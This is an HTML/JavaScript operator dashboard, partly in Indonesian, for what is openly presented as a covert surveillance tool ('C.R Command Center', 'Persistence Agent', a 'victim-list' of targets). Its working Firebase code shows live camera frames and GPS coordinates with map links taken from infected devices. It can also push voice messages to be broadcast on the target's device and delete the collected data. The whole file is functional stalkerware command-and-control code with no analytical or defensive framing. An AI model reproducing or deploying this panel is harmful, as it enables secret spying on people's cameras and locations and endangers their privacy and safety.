<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R Monitoring V1.7 - Persistence Mode</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        #stream-img { width: 100%; height: 100%; object-fit: contain; background: #000; }
        .status-tag { font-size: 9px; padding: 2px 5px; border-radius: 3px; }
    </style>
</head>
<body class="p-4">
    <div class="max-w-6xl mx-auto">
        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
            <div>
                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.7</h1>
                <p class="text-xs text-gray-500 text-green-400">PERSISTENCE AGENT ACTIVE</p>
            </div>
            <div id="auth-info" class="text-[10px] text-gray-400 font-mono">Connecting...</div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <!-- Target List -->
            <div class="lg:col-span-1 border-r border-green-900 pr-4">
                <h2 class="text-lg font-bold mb-4 uppercase text-red-500">Targets</h2>
                <div id="victim-list" class="space-y-2">
                    <div class="text-[10px] text-gray-600 italic">Scanning for active agents...</div>
                </div>
            </div>

            <!-- Dashboard -->
            <div class="lg:col-span-3">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <!-- Stream Display -->
                    <div class="glitch-border p-4 bg-black relative">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-xs text-red-500 font-bold uppercase">Target View</span>
                            <span class="live-indicator" id="live-status">● OFFLINE</span>
                        </div>
                        <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
                            <img id="stream-img" src="" class="hidden">
                            <div id="placeholder" class="text-gray-700 text-xs text-center p-4">
                                [AWAITING SIGNAL FROM PERSISTENT AGENT]
                            </div>
                        </div>
                        <div class="mt-4 p-3 bg-gray-900 border border-green-900 rounded flex justify-between items-end">
                            <div>
                                <p class="text-[10px] text-green-500 uppercase font-bold">Intel Coordinates:</p>
                                <p class="text-xs text-white font-mono" id="lat-long">NO DATA</p>
                            </div>
                            <a id="map-link" href="#" target="_blank" class="bg-blue-600 text-[9px] text-white px-2 py-1 rounded hidden uppercase font-bold">Google Maps</a>
                        </div>
                    </div>

                    <!-- Voice Control -->
                    <div class="glitch-border p-4 bg-black flex flex-col">
                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Intercom System</h3>
                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Tulis suara untuk disiarkan ke target..."></textarea>
                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 transition-all uppercase text-xs">Broadcast Voice</button>
                        
                        <div class="mt-4 pt-2 border-t border-gray-800 flex justify-between">
                            <button id="purge-btn" class="text-[9px] text-red-500 uppercase hover:underline">Flush Buffers</button>
                            <span class="text-[9px] text-gray-600">V1.7-STABLE</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, setDoc, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = JSON.parse(__firebase_config);
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

        onAuthStateChanged(auth, async (user) => {
            if (!user) await signInAnonymously(auth);
            else {
                document.getElementById('auth-info').innerText = "SESSION: " + user.uid.substring(0,10);
                initMonitor();
            }
        });

        function initMonitor() {
            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
            onSnapshot(streamCol, (snap) => {
                const list = document.getElementById('victim-list');
                if(!snap.empty) list.innerHTML = '';
                
                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    const img = document.getElementById('stream-img');
                    const ph = document.getElementById('placeholder');
                    
                    const v = document.createElement('div');
                    v.className = "p-2 border border-green-900 text-[10px] bg-green-900 bg-opacity-10 mb-1 flex justify-between items-center";
                    v.innerHTML = `<span>TGT_${data.uid?.substring(0,6)}</span> <span class="status-tag bg-green-600 text-white">ONLINE</span>`;
                    list.appendChild(v);

                    if (data.frame) {
                        img.src = data.frame;
                        img.classList.remove('hidden');
                        ph.classList.add('hidden');
                        document.getElementById('live-status').innerText = "● LIVE";
                    }

                    if (data.location) {
                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
                        const mLink = document.getElementById('map-link');
                        mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                        mLink.classList.remove('hidden');
                    }
                });
            });
        }

        document.getElementById('send-voice').onclick = async () => {
            const txt = document.getElementById('voice-msg').value;
            if(!txt) return;
            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                text: txt,
                timestamp: Date.now()
            });
            document.getElementById('voice-msg').value = "";
        };

        document.getElementById('purge-btn').onclick = async () => {
            const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
            snap.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
        };
    </script>
</body>
</html>
